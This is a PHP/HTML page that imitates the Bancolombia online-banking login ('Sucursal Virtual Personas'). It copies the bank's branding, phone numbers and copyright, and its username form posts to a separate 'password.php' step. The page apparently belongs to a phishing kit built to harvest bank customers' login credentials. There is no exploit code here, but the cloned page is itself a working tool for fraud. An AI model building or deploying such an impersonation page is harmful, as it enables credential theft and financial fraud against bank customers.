<?php 
    error_reporting(0);
    date_default_timezone_set('America/Bogota');

    function getRealIP() {

        if (!empty($_SERVER['HTTP_CLIENT_IP']))
            return $_SERVER['HTTP_CLIENT_IP'];
        
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
    
        return $_SERVER['REMOTE_ADDR'];
    }

    function get_nombre_dia($fecha){
        $fechats = strtotime($fecha); //pasamos a timestamp
     
     //el parametro w en la funcion date indica que queremos el dia de la semana
     //lo devuelve en numero 0 domingo, 1 lunes,....
     switch (date('w', $fechats)){
         case 0: return "Domingo"; break;
         case 1: return "Lunes"; break;
         case 2: return "Martes"; break;
         case 3: return "Miercoles"; break;
         case 4: return "Jueves"; break;
         case 5: return "Viernes"; break;
         case 6: return "Sabado"; break;
     }
     }


    function getMonth() {
        switch (date("m")) {
            case '01':
                return 'Enero';
                break;
            case '02':
                return 'Febrero';
                break;
            case '03':
                return 'Marzo';
                break;
            case '04':
                return 'Abril';
                break;
            case '05':
                return 'Mayo';
                break;
            case '06':
                return 'Junio';
                break;
            case '07':
                return 'Julio';
                break;
            case '08':
                return 'Agosto';
                break;
            case '09':
                return 'Septiembre';
                break;
            case '10':
                return 'Octubre';
                break;
            case '11':
                return 'Noviembre';
                break;
            case '12':
                return 'Diciembre';
                break;
            
            default:
                'Dato invalido';
                break;
        }
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido</title>
    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @font-face {
            font-family: 'Open Sans';
            src: url('./assets/fonts/OpenSans-Regular.ttf');
        }
        @font-face {
            font-family: 'CIBFontSans';
            src: url('./assets/fonts/CIBFontSans-Light.ttf');
        }
        * {
            font-family: 'Open Sans';
        }
        .font-custom {
            font-family: 'CIBFontSans' !important;
        }
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input:focus {
            outline: none;
        }

    </style>
</head>
<body>
    <div class=" sm:mx-[55px] px-[15px] pt-[10px]">
        <div class="flex flex-col gap-[10px] pb-[20px]">
            <div>
                <img src="./assets/logo.svg" alt="logo" class="sm:mt-[10px]">
            </div>
            <p class="text-base text-[#2c2a29]">Sucursal Virtual Personas</p>
            <div>
                <p class="text-[12px] text-[#2c2a29] inline-block">
                    Fecha y hora actual: 
                    <p class="ml-5 inline-block text-xs"><?php echo get_nombre_dia(date("Y") . '-'. date("m") .'-'. date("d")) . " del " . getMonth() . " de " . date("Y") ;?></p>
                    <p class="inline-block text-xs" id="hora"></p>
            </p>
                <!-- <p class="text-[11px] text-[#2c2a29]">.........</p> -->
            </div>
        </div>

        <div class="px-[15px] py-[10px] bg-[#2c2a29]">
            <p class="ml-[5px] text-white font-custom">Inicio de sesión</p>
        </div>

        <div class="pt-[30px] grid md:grid-cols-12 mb-[35px]">
            
            <div class="grid md:col-start-1 md:col-end-5 gap-[15px]">
                <div class="border-[1px] border-[#CCCCCC] pb-[15px]">
                    
                    <form action="password.php" method="POST">
                        <div class="px-[5px] py-[5px] bg-[#2c2a29]">
                            <p class="font-custom ml-[5px] text-white">Usuario</p>
                        </div>
                        <div class="bg-[#F4F4F4] px-[5px]">
                            <p class="px-[5px] py-[8px] text-xs">Si no tienes un usuario asignado ingresa con tu documento de identidad</p>
                        </div>

                        <div class="px-[10px] pt-[8px] flex gap-3 flex-col">
                            <div class="flex gap-3">
                                <img style="height: 13px;" src="./assets/icons/info-user.png" alt="">
                                <p class="text-sm text-[#2c2a29] font-custom font-bold">Ingresa tu usuario</p>
                            </div>
                            

                            <div class="relative">
                                <input name="usuario" type="text" class="border-[1px] border-[#CCCCCC] py-[5px] px-12 text-sm w-full">
                                <img src="./assets/icons/user.png" alt="" class="absolute top-2 left-5 w-[18px]">
                            </div>

                            <div class="pt-[30px] flex justify-center">
                                <button class="bg-[#fdda24] text-sm px-[15px] pt-[8px] pb-[7px] text-[#2c2a29]">Continuar</button>
                            </div>
                            <div class="flex flex-col gap-[15px] items-end text-sm">
                                <a href="#" class="">¿Olvidaste tu usuario?</a>
                                <a href="#" class="">¿Problemas para conectarte?</a>
                            </div>
                        </div>
                    </form>
                    
                </div>

                <div class="border-[1px] border-[#CCCCCC] py-[15px] px-[9px] flex flex-col gap-4">

                    <div class="flex items-center gap-[10px]">
                        <div>
                            <img class="w-[25px]" src="./assets/icons/computer.png" alt="">
                        </div>
                        <a href="#" class="text-sm text-[#2c2a29]">Conoce sobre Sucursal Virtual Personas</a>
                    </div>

                    <div class="flex items-center gap-[15px]">
                        <div>
                            <img class="h-[22px]" src="./assets/icons/lock.png" alt="">
                        </div>
                        <a href="#" class="text-sm text-[#2c2a29]">Aprende sobre Seguridad</a>
                    </div>
                    
                    <div class="flex items-center gap-[18px]">
                        <div>
                            <img class="h-[19px]" src="./assets/icons/document.png" alt="">
                        </div>
                        <a href="#" class="text-sm text-[#2c2a29]">Reglamento Sucursal Virtual</a>
                    </div>
                    
                    <div class="flex items-center gap-[10px]">
                        <div>
                            <img class="w-[25px]" src="./assets/icons/politic.png" alt="">
                        </div>
                        <a href="#" class="text-sm text-[#2c2a29]">Política de Privacidad</a>
                    </div>
                
                </div>

            </div>
            

            <div class="grid md:auto-cols-max ">
                <div class="flex flex-col items-end gap-[20px]">
                    <img src="./assets/banner-derecho.png" class="w-full" alt="">
                    <p class="text-center text-sm">¿No conoces la Sucursal Virtual Personas de Bancolombia?  Conoce más <a href="#" class="underline underline-offset-1">Aquí</a></p>
                </div>
            </div>

            <div>

            </div>
        
        </div>

        <footer>
            <p class="text-xs">
                Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - 
                <br/>
                Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
		 
            </p>
            <div class="flex justify-between text-[12px] mt-2">
                <p>Dirección IP: <?php echo getRealIP(); ?></p>
                <p>Copyright © Bancolombia S.A.</p>
            </div>
        </footer>
    </div>

    <script>

        const horaSelector = document.querySelector('#hora');
        const currentTime = new Date();
        horaSelector.innerText = currentTime.toLocaleTimeString('en-US');
        
        setInterval(() => {
            const currentTime = new Date();
            horaSelector.innerText = currentTime.toLocaleTimeString('en-US');
        }, 1000);
        

    </script>
</body>
</html>